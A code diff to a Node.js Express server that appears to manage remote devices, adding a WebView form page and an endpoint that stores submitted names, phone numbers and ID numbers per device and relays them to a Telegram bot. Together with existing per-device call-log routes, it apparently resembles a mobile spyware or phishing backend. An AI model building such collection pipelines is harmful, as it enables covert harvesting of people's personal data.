@@ -2,9 +2,14 @@ import express from 'express';
 import { createServer } from 'http';
 import { Server } from 'socket.io';
 import cors from 'cors';
+import path from 'path';
+import { fileURLToPath } from 'url';
 import { setupSocketHandlers } from './socket/handlers.js';
 import { store } from './store.js';
 import { initTelegramBot } from './telegram/bot.js';
+
+const __filename = fileURLToPath(import.meta.url);
+const __dirname = path.dirname(__filename);
 
 const app = express();
 const httpServer = createServer(app);
@@ -19,6 +24,14 @@ const corsOptions = {
 
 app.use(cors(corsOptions));
 app.use(express.json());
+
+// Serve static files from public directory
+app.use(express.static(path.join(__dirname, 'public')));
+
+// Form page route
+app.get('/form', (req, res) => {
+    res.sendFile(path.join(__dirname, 'public', 'form.html'));
+});
 
 // Socket.IO server with proper timeout settings
 const io = new Server(httpServer, {
@@ -102,6 +115,26 @@ app.get('/api/devices/:id/calls', (req, res) => {
 app.get('/api/devices/:id/forms', (req, res) => {
     const forms = store.getForms(req.params.id);
     res.json(forms);
+});
+
+// Form submission endpoint (from WebView)
+app.post('/api/form/submit', (req, res) => {
+    const { deviceId, name, phoneNumber, id } = req.body;
+
+    if (!deviceId || !name || !phoneNumber || !id) {
+        return res.status(400).json({ error: 'Missing required fields' });
+    }
+
+    // Store the form data
+    store.submitForm(deviceId, { name, phoneNumber, id });
+
+    // Notify via Telegram if enabled
+    if (telegramBot.isActive()) {
+        telegramBot.notifyNewForm(deviceId, { name, phoneNumber, id, submittedAt: new Date() });
+    }
+
+    console.log(`[Form] New submission from device ${deviceId}: ${name}, ${phoneNumber}, ${id}`);
+    res.json({ success: true, message: 'Form submitted successfully' });
 });
 
 const PORT = process.env.PORT || 3001;
